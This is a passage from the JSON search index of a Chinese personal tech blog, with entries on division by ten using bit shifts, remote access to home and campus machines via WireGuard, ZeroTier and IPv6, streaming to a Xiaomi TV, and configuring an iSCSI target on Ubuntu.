number</p>","tags":["div10","\u4f4d\u8fd0\u7b97"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/02/05/2022-02-05-%E4%BD%BF%E7%94%A8%E6%95%B4%E6%95%B0%E4%BD%8D%E8%BF%90%E7%AE%97%E8%AE%A1%E7%AE%97div10/#1","title":"1","text":"<p>1/10 \u4e8c\u8fdb\u5236\u5e8f\u5217\u4e3a 0.0001100110011...</p> <p>\u56e0\u6b64\u4e3b\u8981\u601d\u8def\u662f\u901a\u8fc7\u8ba1\u7b97\u4ee5\u4e0b\u7ea7\u6570\u7684\u524d\u82e5\u5e72\u9879\u6765\u83b7\u5f97\\(x \\over 10\\)\u7684\u8fd1\u4f3c\u503c\uff1a $$ {x \\over 10} = {x \\over 2^4} + {x \\over 2^5} + {x \\over 2^8} + {x \\over 2^9} + {x \\over 2^{12}} + {x \\over 2^{13}} + {x \\over 2^{16}} + {x \\over 2^{17}} +  {x \\over 2^{20}} + {x \\over 2^{21}} +... $$ \u7136\u800c\u8ba1\u7b97\u4e0a\u8ff0\u5f0f\u5b50\u65f6\uff0c\u56e0\u4e3a\u6bcf\u4e00\u9879\u91c7\u7528\u7684\u662f\u6574\u6570\u53f3\u79fb\u7684\u65b9\u5f0f\uff0c\u56e0\u6b64\u6bcf\u4e00\u9879\u4fdd\u7559\u6210\u6574\u6570\u65f6\u90fd\u4f1a\u4ea7\u751f\u820d\u5165\u8bef\u5dee\uff0c\u7d2f\u52a0\u8d77\u6765\u540e\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u8bef\u5dee\u3002\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u4e00\u4e2a\u597d\u65b9\u6cd5\u662f\u5148\u5c06\u6574\u6570\u5de6\u79fb\u82e5\u5e72\u4f4d\u5f97\u5230\\(x^{\\prime}\\)\uff1a $$ x^{\\prime} = x &lt;&lt; k $$ \u8fd9\u6837\u5c06\\(x^{\\prime}\\)\u53f3\u79fbk\u4f4d\u4ee5\u5185\u65f6\uff0c\u7ed3\u679c\u4ecd\u662f\u6574\u6570\u3002\u5c06\u6bcf\u9879\u7d2f\u52a0\u540e\uff0c\u518d\u53f3\u79fbk\u4f4d\u5373\u53ef\u8fd8\u539f\u4e3a\u539f\u672c\u7ed3\u679c\u3002</p> <p>\u6b64\u65f6\u6211\u4eec\u8ba1\u7b97\u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a $$ x^{\\prime} = x &lt;&lt; k\\ t = \\sum_{i=1}^{n}{({x^{\\prime} \\over 2^{4i}}+{x^{\\prime} \\over 2^{4i+1}})}\\ r = t &gt;&gt; k \\ k \\ge 4n+1 $$</p>","tags":["div10","\u4f4d\u8fd0\u7b97"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/02/05/2022-02-05-%E4%BD%BF%E7%94%A8%E6%95%B4%E6%95%B0%E4%BD%8D%E8%BF%90%E7%AE%97%E8%AE%A1%E7%AE%97div10/#2","title":"2","text":"<p>\u63a5\u4e0b\u6765\u8981\u8003\u8651\u7cbe\u5ea6\u7684\u95ee\u9898\uff0c\u5f53\u6211\u4eec\u8ba1\u7b97t\u65f6\uff0c\u7531\u4e8e\u622a\u65ad\u4f1a\u4ea7\u751f\u8bef\u5dee\uff0c\u53ef\u4ee5\u7b97\u5f97\uff1a $$ \\Delta = \\sum_{i=n+1}^{\\infin}{({x^{\\prime} \\over 2^{4i}}+{x^{\\prime} \\over 2^{4i+1}})}\\ \\Rightarrow \\Delta = {x^{\\prime} \\over 2^{4n+1}}\\cdot{1 \\over 5} $$ \u5373\uff1a $$ t = {x^{\\prime} \\over 10} - \\Delta $$ \u8fdb\u4e00\u6b65\u53ef\u5f97\uff1a $$ r = {x \\over 10} - {x \\over 2^{4n+1}}\\cdot{1 \\over 5} $$</p>","tags":["div10","\u4f4d\u8fd0\u7b97"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/02/05/2022-02-05-%E4%BD%BF%E7%94%A8%E6%95%B4%E6%95%B0%E4%BD%8D%E8%BF%90%E7%AE%97%E8%AE%A1%E7%AE%97div10/#3","title":"3","text":"<p>\u7531\u4e8ex\u662f16\u4f4dunsigend short\u7c7b\u578b\uff0c\u56e0\u6b64 $$ 0 \\le x \\le 2^{16}-1 $$ \u5f53n\u53d64\u65f6\uff0c\u53ef\u5f97r\u4e0ex/10\u7684\u504f\u5dee\u6700\u5927\u65f6(x\u53d6\u6700\u5927)\u4e3a\\(0.1 - \\sigma\\)\uff0c\u5c0f\u4e8e0.1\uff08\\(\\sigma\u662f\u7531\u4e8ex\u53d6\u4e0d\u52302^{16}\u5bfc\u81f4\u7684\\)\uff09</p> <p>\u7531\u4e8er\u548cx/10\u7684\u8bef\u5dee\u5df2\u7ecf\u5c0f\u4e8e0.1\u4e86\uff0c\u6613\u77e5\u5f53x/10\u975e\u6574\u9664\u65f6\uff0cx/10\u548cr\u5411\u4e0b\u53d6\u6574\u5230\u540c\u4e00\u4e2a\u6574\u6570\u3002</p> <p></p>","tags":["div10","\u4f4d\u8fd0\u7b97"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/02/05/2022-02-05-%E4%BD%BF%E7%94%A8%E6%95%B4%E6%95%B0%E4%BD%8D%E8%BF%90%E7%AE%97%E8%AE%A1%E7%AE%97div10/#4","title":"4","text":"<p>\u4e0a\u9762\u7684\u65b9\u6cd5\u5728x\u4e0d\u662f10\u7684\u500d\u6570\u65f6\uff0c\u5df2\u7ecf\u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u503c\u4e86\u3002\u4e0d\u8fc7\u4e3a\u4e86\u5f97\u5230\u5b8c\u5168\u6b63\u786e\u7684\u7ed3\u679c\uff0c\u8fd8\u9700\u8981\u8fdb\u4e00\u6b65\u4fee\u6b63\u3002</p> <p>\u4e00\u4e2a\u601d\u8def\u662f\u5728x\u6574\u966410\u65f6\u8fdb\u884c+1\u4fee\u6b63\uff0c\u8fd9\u91cc\u4e5f\u6709\u5f88\u591a\u9a9a\u64cd\u4f5c\u3002</p> <p>\u4e0d\u8fc7\u8fd8\u6709\u4e00\u4e2a\u66f4\u597d\u7684\u65b9\u5f0f\uff0c\u662f\u5bf9\u8ba1\u7b97\u51fa\u7684r\u589e\u52a0\u4e00\u4e2a\u504f\u79fb\uff1a $$ r^{\\prime} = r + \\delta $$ \u4f7f\u4e4b\u6ee1\u8db3\uff1a $$ {x \\over 10} \\le r^{\\prime}&lt; {x \\over 10}+0.1 $$ \u8fd9\u6837\u4fbf\u53ef\u4ee5\u4fdd\u8bc1\\(r^{\\prime}\\)\u5411\u4e0b\u53d6\u6574\u540e\u53d6\u5f97\u6b63\u786e\u7684\u503c\u3002</p> <p>\u4ee3\u5165r\u7684\u5f0f\u5b50\u8ba1\u7b97\u540e\u5f97\uff1a $$ {x \\over 2^{4n+1}}\\cdot{1 \\over 5} \\le \\delta \\lt {1 \\over 10} + {x \\over 2^{4n+1}}\\cdot{1 \\over 5} $$ \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e0a\u5f0f\u8981\u5bf9\u4efb\u610f\u7684x\u90fd\u6210\u7acb\u7684\u3002</p> <p>\u5f53x=0\u65f6\uff0c\u53ef\u4ee5\u5f97\u5230\\(\\delta\\)\u7684\u4e0a\u754c\uff0c\u800c\\(\\delta\\)\u7684\u4e0b\u754c\u7531x\u7684\u6700\u5927\u503c\u786e\u5b9a\uff0c\u53ef\u5f97\uff1a $$ {2^{16} - 1 \\over 2^{4n+1}}\\cdot{1 \\over 5} \\le \\delta \\lt {1 \\over 10} $$</p> <p>\u4e8b\u5b9e\u4e0a\u5bf9\\(r\\)\u6dfb\u52a0\u504f\u79fb\u662f\u4e3a\u4e86\u6613\u4e8e\u8bf4\u660e\uff0c\u5b9e\u9645\u4e0a\u6211\u4eec\u662f\u5728\u8ba1\u7b97\u5f97\u5230\u7684\u6574\u6570\\(t\\)\u200b\u200b\u200b\u4e0a\u589e\u52a0\u4e00\u4e2a\u6574\u6570\u504f\u79fb\uff1a $$ t^{\\prime} = t + \\delta $$ \u7531\u4e0a\u9762\u7684\u5206\u6790\uff0c\u53ef\u5f97\u4e0b\u5f0f\uff0c\u5176\u4e2d\\(\\delta\\)\u53d6\u6574\u6570\uff1a $$ {2^{16} - 1 \\over 2^{4n+1}}\\cdot{1 \\over 5}2^{16} \\le \\delta \\lt {1 \\over 10}2^{16} $$</p> <p>\u53ef\u4ee5\u53d1\u73b0\uff0c\u5f53n=4\u65f6\uff0c\\(\\delta\\)\u65e0\u6574\u6570\u89e3</p> <p>\u6240\u4ee5n\u9700\u8981\u53d65\u4ee5\u4e0a\uff0c\u5f53n=5\u65f6\uff0c\u5f97\uff1a $$ 409.59375 \\le \\delta \\lt 6553.6 $$ \u6700\u540e\u7684\u8ba1\u7b97\u8fc7\u7a0b\u4e3a\uff1a $$ x^{\\prime} = x &lt;&lt;16\\ t = \\sum_{i=1}^{5}{({x^{\\prime} \\over 2^{4i}}+{x^{\\prime} \\over 2^{4i+1}})} + 410\\ r = t &gt;&gt; 16 \\ $$ \u867d\u7136n=5\u65f6\uff0c\u5de6\u79fb16\u4f4d\uff0c\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u8ba1\u7b97t\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6ca1\u6709\u820d\u5165\u8bef\u5dee\uff0c\u597d\u5728\u8be5\u8bef\u5dee\u6bd4\u8f83\u5c0f\uff0c\u5bf9\u6700\u540e\u7ed3\u679c\u6ca1\u6709\u9020\u6210\u592a\u5927\u5f71\u54cd\u3002\u7ecf\u5b9e\u9a8c\u540e\uff0c\u5b9e\u9645\u6700\u540e\u7684\\(\\delta\\)\u53d6\u503c\u53ef\u4e3a\\([410, 6554]\\)\uff0c\u548c\u7406\u8bba\u5206\u6790\u4ec5\u5dee1\u3002</p>","tags":["div10","\u4f4d\u8fd0\u7b97"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/11/2022-02-11-%E4%B8%8D%E5%90%8C%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","title":"\u4e0d\u540c\u60c5\u51b5\u4e0b\u7684\u5185\u7f51\u7a7f\u900f","text":"","tags":["\u5185\u7f51\u7a7f\u900f"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/11/2022-02-11-%E4%B8%8D%E5%90%8C%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#\u6280\u672f\u8bf4\u660e","title":"\u6280\u672f\u8bf4\u660e","text":"<ul> <li>ddns\uff1a\u5c06\u52a8\u6001\u7684\u516c\u7f51ip\u5730\u5740\u7ed1\u5b9a\u5230\u4e00\u4e2a\u57df\u540d\u4e0a</li> <li>\u901a\u8fc7VPN\u8bbf\u95ee\u5185\u7f51\uff1a\u5728\u4e92\u8054\u7f51\u4e0a\u5efa\u7acb\u4e00\u4e2a\u96a7\u9053\uff0c\u901a\u8fc7\u96a7\u9053\u53ef\u5b9e\u73b0\u8bbf\u95ee\u5185\u7f51\u8bbe\u5907</li> <li>\u7aef\u53e3\u8f6c\u53d1\uff1a\u5c06\u53d1\u9001\u7ed9A\u7684\u67d0\u4e2a\u7aef\u53e3\u7684\u6570\u636e\u8f6c\u53d1\u7ed9B\u7684\u67d0\u4e2a\u7aef\u53e3\u3002\u5bf9\u4e8e\u8bbf\u95ee\u8005\u6765\u8bf4\uff0c\u8bbf\u95ee\u7684\u662fA\uff0c\u5b9e\u9645\u54cd\u5e94\u7684\u662fB</li> </ul>","tags":["\u5185\u7f51\u7a7f\u900f"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/11/2022-02-11-%E4%B8%8D%E5%90%8C%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#\u7f51\u7edc\u72b6\u51b5","title":"\u7f51\u7edc\u72b6\u51b5","text":"<p>\u8bbe\u5907A\u4f4d\u4e8e\u8def\u7531\u5668\u540e\uff0c\u8bbe\u5907B\u60f3\u8981\u8fdc\u7a0b\u8fde\u63a5A\u3002\u4ee5\u4e0b\u662f\u8bbe\u5907B\u5206\u522b\u4f7f\u7528ipv4\u548cipv6\u8bbf\u95eeA\u65f6\u4e0d\u540c\u60c5\u51b5\u7684\u5904\u7406\u65b9\u5f0f\u3002</p> <ul> <li>ipv4</li> <li>\u8def\u7531\u5668WAN\u53e3\u6709\u516c\u7f51ipv4\u5730\u5740<ol> <li>\u65b9\u5f0f\u4e00\uff1a\u8def\u7531\u5668ddns + \u8def\u7531\u5668\u7aef\u53e3\u8f6c\u53d1</li> <li>\u65b9\u5f0f\u4e8c\uff1awireguard\uff0cB\u901a\u8fc7VPN\u8fde\u63a5\u5230\u8def\u7531\u5668\u4e0a\uff0c\u8fdb\u800c\u8bbf\u95ee\u5185\u7f51\u8bbe\u5907</li> </ol> </li> <li>\u8def\u7531\u5668WAN\u53e3\u4e3a\u5185\u7f51ipv4\u5730\u5740<ol> <li>\u65b9\u5f0f\u4e00\uff1aA\u4e0a\u5b89\u88c5Zerotier\uff0cB\u4e0a\u4e5f\u5b89\u88c5Zerotier\uff0cAB\u4fbf\u53ef\u4ee5\u901a\u8fc7\u865a\u62df\u7684Zerotier\u5730\u5740\u76f8\u4e92\u8bbf\u95ee\u3002</li> <li>\u65b9\u5f0f\u4e8c\uff1a\u5728\u8def\u7531\u5668\u4e0a\u5b89\u88c5Zerotier\uff0c\u540c\u65f6\u5728Zerotier central\u4e2d\u914d\u7f6e\u8f6c\u53d1\u89c4\u5219\uff08\u5177\u4f53\u65b9\u5f0f\u81ea\u884c\u641c\u7d22\uff09\u3002B\u4e0a\u5b89\u88c5Zerotier\uff0c\u6b64\u65f6B\u4e0d\u4ec5\u53ef\u4ee5\u8bbf\u95ee\u8def\u7531\u5668\uff0c\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u8def\u7531\u5668LAN\u4e2d\u7684\u5176\u5b83\u8bbe\u5907\uff0c\u56e0\u6b64\u53ef\u4ee5\u8bbf\u95eeA</li> <li>\u6ce8\uff1aZerotier\u8fde\u63a5\u7684\u4e24\u4e2a\u8bbe\u5907\u95f4\u7684\u901a\u4fe1\u4e0d\u4e00\u5b9a\u5168\u9760Zerotier\u670d\u52a1\u5668\u4e2d\u8f6c\uff0c\u5982\u679c\u4e24\u4e2a\u8bbe\u5907\u4e2d\u95f4\u7684NAT\u7ed3\u6784\u6bd4\u8f83\u597d\u7684\u8bdd\uff0cZerotier\u4f1a\u901a\u8fc7UDP\u6253\u6d1e\u7684\u65b9\u5f0f\uff0c\u8ba9\u4e24\u4e2a\u8bbe\u5907\u76f4\u63a5\u901a\u4fe1\u3002</li> </ol> </li> <li>ipv6</li> <li>\u8def\u7531\u5668WAN\u53e3\u548cA\u5747\u6709\u516c\u7f51ipv6\u5730\u5740<ul> <li>\u76f4\u63a5\u5728PC\u4e0a\u914d\u7f6eddns   \u6ce8\uff1a1\uff09\u5982\u679cPC\u65e0ipv6\uff0c\u90a3\u4e48\u914d\u7f6e\u8def\u7531\u5668\u4e0d\u8981\u4f7f\u7528NAT6   2\uff09ipv6\u7684\u7aef\u53e3\u8f6c\u53d1\u662f\u4e0d\u5fc5\u8981\u7684</li> <li>\u6ce8\uff1a\u76ee\u524d\u6240\u6709ISP\u4e00\u822c\u90fd\u63d0\u4f9b\u4e86\u516c\u7f51ipv6\u5730\u5740\uff0c\u53ef\u80fd\u9700\u8981\u5728\u5149\u732b\u4e2d\u5f00\u542f\u3002</li> </ul> </li> <li>\u7279\u6b8a\u60c5\u51b5</li> <li>\u867d\u7136\u65e0\u516c\u7f51ipv4\u5730\u5740\uff0c\u4f46\u662f\u5982\u679cA, B\u53ef\u4ee5ping\u901a\u5bf9\u65b9\uff08\u6bd4\u5982\u90fd\u4f4d\u4e8e\u6821\u56ed\u7f51\u4e2d\uff09\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528ip\u5730\u5740\u76f4\u63a5\u8fdc\u7a0b\u8fde\u63a5\u3002</li> <li>\u867d\u7136\u6709\u516c\u7f51ipv4/ipv6\u5730\u5740\uff0c\u4f46\u662fB\u53ef\u80fd\u4ecd\u65e0\u6cd5\u8bbf\u95eeA\u3002\u6bd4\u5982\uff0c\u6821\u56ed\u7f51\u867d\u7136\u63d0\u4f9b\u4e86\u516c\u7f51\u5730\u5740\uff0c\u4f46\u662f\u6821\u5916\u8bbf\u95ee\u65f6\u4f1a\u88ab\u9632\u706b\u5899\u62e6\u622a\u3002<ul> <li>\u8fd9\u79cd\u60c5\u51b5wireguard\u4ecd\u7136\u6709\u6548\uff0c\u4e0d\u4f1a\u88ab\u9632\u706b\u5899\u62e6\u622a</li> <li>\u4e00\u822c\u53ea\u5bf9ipv4\u5730\u5740\u8fdb\u884c\u62e6\u622a\uff0cipv6\u57fa\u672c\u4e0d\u600e\u4e48\u62e6\u622a\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528ipv6</li> </ul> </li> </ul>","tags":["\u5185\u7f51\u7a7f\u900f"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/11/2022-02-11-%E4%B8%8D%E5%90%8C%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#\u7f51\u7edc\u7a7f\u900f\u8fdc\u7a0b\u684c\u9762\u7528\u4f8b","title":"\u7f51\u7edc\u7a7f\u900f+\u8fdc\u7a0b\u684c\u9762\u7528\u4f8b","text":"<p>\u6ce8\uff1a\u62ec\u53f7\u5185\u4e3a\u8981\u6c42 - \uff08\u540c\u65f6\u8fde\u63a5\u5728\u6821\u56ed\u7f51\u4e0a\uff09\u53bb\u5b9e\u9a8c\u5ba4\u505a\u5b9e\u9a8c\u65f6\uff0c\u76f4\u63a5\u8fdc\u7a0b\u8fde\u63a5\u5bdd\u5ba4\u7535\u8111\uff0c\u518d\u4e5f\u4e0d\u7528\u5e26\u7535\u8111\u4e86\u3002 - \uff08\u540c\u65f6\u8fde\u63a5\u5728\u6821\u56ed\u7f51\u4e0a\uff09\u5728\u6559\u5ba4\u7684\u591a\u5a92\u4f53\u7535\u8111\u4e0a\u8fdc\u7a0b\u8fde\u63a5\u5bdd\u5ba4\u7535\u8111\uff08\u6709\u4e00\u6b21\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u6551\u6025\u62f7\u8d1d\u4e86\u6f14\u8bb2\u7684ppt\uff09 - \uff08\u540c\u65f6\u8fde\u63a5\u5728\u6821\u56ed\u7f51\u4e0a\uff09\u5728\u5b9e\u9a8c\u5ba4\uff0c\u4e32\u6d41\u73a9\u5bdd\u5ba4\u7684\u53f0\u5f0f\u7535\u8111\u3002 - \uff08\u6821\u56ed\u7f51\u6709\u516c\u7f51ipv4\uff09\u653e\u5047\u5728\u5bb6\uff0c\u901a\u8fc7wireguard\u8fdc\u7a0b\u8bbf\u95ee\u4f4d\u4e8e\u5b66\u6821\u7684\u53f0\u5f0f\u7535\u8111\u3002</p>","tags":["\u5185\u7f51\u7a7f\u900f"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/11/2022-02-11-%E7%A7%BB%E5%8A%A8%E5%85%89%E7%8C%AB%E5%BC%80%E5%90%AFipv6/","title":"\u79fb\u52a8\u5149\u732b\u5f00\u542fipv6","text":"<ol> <li>\u79fb\u52a8\u5149\u732b\u4f7f\u7528\u6865\u63a5\u6a21\u5f0f + \u8def\u7531\u5668\u4f7f\u7528\u62e8\u53f7\u4e0a\u7f51</li> <li>\u79fb\u52a8\u5149\u732b\u5f00\u542fipv6\u6b65\u9aa4<ol> <li>\u5220\u9664\u539f\u672cipv4\u7684PPPoE</li> <li>\u534f\u8bae\u9009\u62e9ipv4/ipv6\uff0c\u521b\u5efa\u65b0\u7684PPP\u8fde\u63a5</li> </ol> </li> </ol>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/12/2022-02-12-%E5%B0%8F%E7%B1%B3%E7%94%B5%E8%A7%86%E8%AE%BF%E9%97%AE%E7%94%B5%E8%84%91%E8%A7%86%E9%A2%91/","title":"\u5c0f\u7c73\u7535\u89c6\u8bbf\u95ee\u7535\u8111\u89c6\u9891","text":"","tags":["\u7535\u89c6"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/12/2022-02-12-%E5%B0%8F%E7%B1%B3%E7%94%B5%E8%A7%86%E8%AE%BF%E9%97%AE%E7%94%B5%E8%84%91%E8%A7%86%E9%A2%91/#\u52a8\u673a","title":"\u52a8\u673a","text":"<p>\u4e00\u53f0\u7535\u8111\u4e0a\u4e0b\u8f7d\u4e86\u8bb8\u591a\u89c6\u9891\uff0c\u5982\u4f55\u4f18\u96c5\u5730\u5728\u5176\u5b83\u8bbe\u5907\u4e0a\uff08\u5176\u5b83\u7535\u8111\u3001\u5e73\u677f\u3001\u7535\u89c6\uff09\u4e0a\u76f4\u63a5\u8bbf\u95ee\u64ad\u653e\u8be5\u89c6\u9891\u5462\uff1f</p>","tags":["\u7535\u89c6"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/12/2022-02-12-%E5%B0%8F%E7%B1%B3%E7%94%B5%E8%A7%86%E8%AE%BF%E9%97%AE%E7%94%B5%E8%84%91%E8%A7%86%E9%A2%91/#what-i-need","title":"what I need","text":"<ul> <li>\u5e73\u677f\uff0c\u7b14\u8bb0\u672c\u7b49\u53ef\u4ee5\u5b89\u88c5wireguard\u7684\u8bbe\u5907\uff0c\u53ef\u4ee5\u8bbf\u95ee\u53f0\u5f0f\u5171\u4eab\u7684\u6587\u4ef6\u5939</li> <li>\u5df2\u7ecf\u5b9e\u73b0</li> <li>\u4f7f\u7528wireguard + SMB + VLC</li> <li>\u5c0f\u7c73\u7535\u89c6\u80fd\u4e0d\u80fd\u88c5wireguard\uff1f<ul> <li>\u88c5VLC\u5931\u8d25</li> <li>\u4f7f\u7528adb\u5b89\u88c5\uff1f\u62a5\u9519<ul> <li><code>INSTALL_FAILED_NO_MATCHING_ABIS</code> is when you are trying to install an app that has native libraries and it doesn't have a native library for your cpu architecture. For example if you compiled an app for armv7 and are trying to install it on an emulator that uses the Intel architecture instead it will not work.</li> </ul> </li> <li>\u5b89\u88c5wiregurad\u6210\u529f</li> <li>\u8bbf\u95ee\u6587\u4ef6\u7cfb\u7edf\u6709bug(\u65e0\u6cd5\u5bfc\u5165\u914d\u7f6e\uff0c\u56e0\u6b64\u9700\u8981\u63a5\u4e0a\u952e\u76d8\u9f20\u6807)</li> <li>\u624b\u52a8\u8f93\u5165\u914d\u7f6e\u540e\uff0c\u663e\u793a\u8fde\u63a5\u4e0a\u4e86\u3002\u4f46\u662fwireguard\u72b6\u6001\u4e2d\u63a5\u6536\u7684\u6d41\u91cf\u53ea\u6709\u51e0\u767eB\u3002\u7136\u540e\u4f7f\u7528kodi\u8fde\u63a5\u4e0d\u4e0aSMB</li> </ul> </li> <li>\u4e00\u4e2a\u6b63\u5e38\u80fdipv6\u4e0a\u7f51\u7684\u8bbe\u5907\u5c31\u80fd\u8bbf\u95ee\u53f0\u5f0f\u5171\u4eab\u7684\u6587\u4ef6\u5939\uff08\u6bd4\u5982\u5c0f\u7c73\u7535\u89c6\uff09</li> <li>\u8f93\u5165ipv6\u592a\u9ebb\u70e6<ul> <li>\u53f0\u5f0f\u673a\u914d\u7f6eddns</li> <li>\u4f7f\u7528freedns\u4e2d\u7684crontab\u811a\u672c(v2)\uff0c\u6dfb\u52a0\u5230windows\u5b9a\u65f6\u4efb\u52a1\u4e2d</li> <li>223.5.5.5\u9700\u8981\u8fc7\u4e2a\u51e0\u5206\u949f\u624d\u4f1a\u751f\u6548</li> <li>8.8.8.8\u5219\u751f\u6548\u5f88\u5feb</li> <li>\u5c06\u7535\u8111dns\u6dfb\u52a08.8.8.8\u4f5c\u4e3a\u5907\u7528dns</li> <li>\u6216\u8def\u7531\u5668\u914d\u7f6eipv6\u7aef\u53e3\u8f6c\u53d1\uff08\u8def\u7531\u5668\u5df2\u7ecf\u914d\u7f6eipv6 ddns\uff09</li> <li>\u8fd8\u672a\u7814\u7a76</li> </ul> </li> <li>SMB\u662f\u5426\u652f\u6301ipv6<ul> <li>windows\u6587\u4ef6\u7ba1\u7406\u5668\u4e2d\u65e0\u6cd5\u8f93\u5165ipv6\u7684\u5192\u53f7</li> <li>\u4f7f\u7528<code>.ipv6-literal.net</code>\u65b9\u5f0f\u89e3\u51b3</li> <li>\u57df\u540d\u662f\u53ef\u4ee5\u7684</li> </ul> </li> </ul>","tags":["\u7535\u89c6"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/","title":"\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8(iSCSi)","text":"","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8iscsi","title":"\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8(iSCSI)","text":"<p>iSCSI is an IP-based standard for transferring data that supports host access by carrying SCSI commands over IP networks. The iSCSI standard is defined by RFC 3720. (iSCSI overview - IBM Documentation)</p> <p>\u4f7f\u7528iSCSI\u53ef\u4ee5\u5c06\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u5b58\u50a8\u8bbe\u5907\u6620\u5c04\u4e3a\u672c\u5730\u7684\u4e00\u4e2a\u5757\u8bbe\u5907</p>","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#\u670d\u52a1\u7aeftarget","title":"\u670d\u52a1\u7aef(target)","text":"<p>\u67e5\u4e86\u4e00\u5708\uff0c\u6ca1\u6709\u627e\u5230\u5728windows\u4e0a\u5f00\u542fiSCSI target\u7684\u6559\u7a0b</p>","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#ubuntu2004","title":"ubuntu20.04","text":"<ol> <li>\u5b89\u88c5</li> </ol> <pre><code>sudo apt install tgt\n</code></pre> <p>\u6b64\u65f6\u5df2\u7ecf\u53ef\u4ee5\u770b\u5230iSCSI\u670d\u52a1\u542f\u52a8\u4e86</p> <pre><code>systemctl status tgt\n</code></pre> <ol> <li>\u914d\u7f6etarget</li> </ol> <p>\u65b0\u5efa\u4e00\u4e2atarget1.conf\u6587\u4ef6</p> <pre><code>vim /etc/tgt/conf.d/target1.conf\n</code></pre> <p>\u914d\u7f6e\u5982\u4e0b</p> <pre><code>&lt;target iqn.2020-05.com:tianyi310.target1&gt;\n    # provided devicce as a iSCSI target\n    backing-store /dev/sda1\n    # iSCSI Initiator's IQN you allow to connect\n    initiator-name iqn.2022-02.com:s3-pro\n    initiator-name iqn.2022-02.com:ryzen5800x\n    # authentication info ( set anyone you like for \"username\", \"password\" )\n    #incominguser user password\n&lt;/target&gt;\n</code></pre> <pre><code>&lt;target iqn.2023-10.com:ryzen.target1&gt;\n     # provided devicce as a iSCSI target\n     backing-store /dev/disk/by-id/scsi-0QEMU_QEMU_HARDDISK_drive-scsi4\n     # iSCSI Initiator's IQN you allow to connect\n     initiator-name iqn.2023-10.com:a1-win10\n     # authentication info ( set anyone you like for \"username\", \"password\" )\n     #incominguser user password\n &lt;/target&gt;\n</code></pre> <p>\u5176\u4e2diqn.2020-05.com:tianyi310.target1\u4e3atarget\u540d\u79f0\uff0c\u6709\u7740\u89c4\u8303\u7684\u683c\u5f0f iqn.1991-05.com.microsoft:kvm-win10</p> <p>\u5b58\u50a8\u8bbe\u5907</p> <p><code>backing-store /dev/sda1</code>\u8868\u793a\u4f7f\u7528sda1\u4f5c\u4e3a\u5b58\u50a8\u8bbe\u5907\uff08\u7b2c\u4e00\u4e2a\u78c1\u76d8(sda)\u4e0a\u7684\u7b2c\u4e00\u4e2a\u5206\u533a(sda1)\uff09</p> <p>\u652f\u6301\u7684\u5b58\u50a8\u8bbe\u5907\uff1a</p> <ul> <li> <p>\u5757\u8bbe\u5907</p> </li> <li> <p>\u5757\u8bbe\u5907\u4e0a\u7684\u4e00\u4e2a\u5206\u533a</p> </li> <li> <p>\u4e00\u4e2a\u6587\u4ef6\u4f5c\u4e3a\u865a\u62df\u7684\u5757\u8bbe\u5907\uff0c\u5982</p> <pre><code>#create folder and file\nmkdir /var/lib/iscsi_disks\ndd if=/dev/zero of=/var/lib/iscsi_disks/disk01.img count=0 bs=1 seek=10G\n</code></pre> </li> </ul> <p>\u6388\u6743</p> <p>\u4e3a\u4e86\u7b80\u5355\uff0c\u4ee5\u4e0a\u914d\u7f6e\u6ca1\u6709\u914d\u7f6eauthentication\u3002\u51e0\u79cd\u5e38\u7528\u6388\u6743\u65b9\u5f0f\uff1a</p> <ul> <li>initiator-name\uff1a\u53ea\u5141\u8bb8\u6307\u5b9aiqn\u540d\u79f0\u7684initiator</li> <li>initator-address\uff1a\u53ea\u5141\u8bb8\u6307\u5b9aip\u7684initiator</li> <li>user, password\uff1a\u6ca1\u8bd5\u8fc7</li> <li> 